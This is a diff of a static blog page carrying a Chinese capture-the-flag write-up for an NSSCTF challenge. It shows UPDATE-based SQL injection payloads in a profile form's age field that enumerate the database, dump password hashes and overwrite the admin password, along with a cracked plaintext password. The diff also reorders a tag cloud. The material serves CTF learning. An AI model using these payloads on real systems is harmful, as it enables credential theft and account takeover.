@@ -147,7 +147,7 @@
 	
 		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2603">题目链接</a></p>
 <p>题目描述：好想知道admin的密码呜呜呜~</p>
-<h2 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h2><p>注册登入发现可以更新个人信息   其中age字段存在update注入</p>
+<h2 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h2><p>注册登入发现可以更新个人信息   其中age字段存在update注入，可通过描述字段查看所需信息</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="number">1</span>)%<span class="number">23</span>	<span class="comment">// 1</span></span><br><span class="line"><span class="number">2</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">// 查看数据库   demo2</span></span><br><span class="line"><span class="number">3</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">//查看表 users</span></span><br><span class="line"><span class="number">4</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x7573657273</span>)%<span class="number">23</span>    <span class="comment">//查看列 id,username,password,nickname,age,description		（注意此处users会导致更新错误 替换为url编码）</span></span><br><span class="line"><span class="number">5</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(password) users)%<span class="number">23</span>	<span class="comment">// 0cc175b9c0f1b6a831c399e269772661 为md5格式</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="修改password"><a href="#修改password" class="headerlink" title="修改password"></a>修改password</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>. nickname=hhh&amp;age=<span class="number">23</span>, password=<span class="number">0x3230326362393632616335393037356239363462303731353264323334623730</span>%<span class="number">23</span> <span class="comment">// 0x32...30 == hex(md5(&#x27;123&#x27;))</span></span><br></pre></td></tr></table></figure>
@@ -155,7 +155,7 @@
 <h3 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h3><p>username: admin password: 123</p>
 <p>这里description是被覆盖过的，因为前面执行 [5] 的时候是对所有用户进行操作，使得description为password</p>
 <p>可以看到description: 5a64edabc9358c603103053a3c600a88 爆破可得原始密码为 <code>iamcool</code> </p>
-<p> 需要重开环境直接  1.修改密码[6]再登录 2.iamcool登录</p>
+<p>需要重开环境直接  1.修改密码[6]再登录 2.iamcool登录</p>
 
 	
 	</div>
@@ -613,45 +613,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/sql/">sql<span>5</span></a></li>
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
 		
 			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
 		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
-		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>16</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>29</span></a></li>
+			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
 		
 			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
 		
-			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
+			<li><a href="/tags/rce/">rce<span>1</span></a></li>
 		
 			<li><a href="/tags/heap/">heap<span>2</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
-		
 			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>4</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>23</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>5</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/web/">web<span>16</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
 		
 			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/stack/">stack<span>2</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>29</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>31</span></a></li>
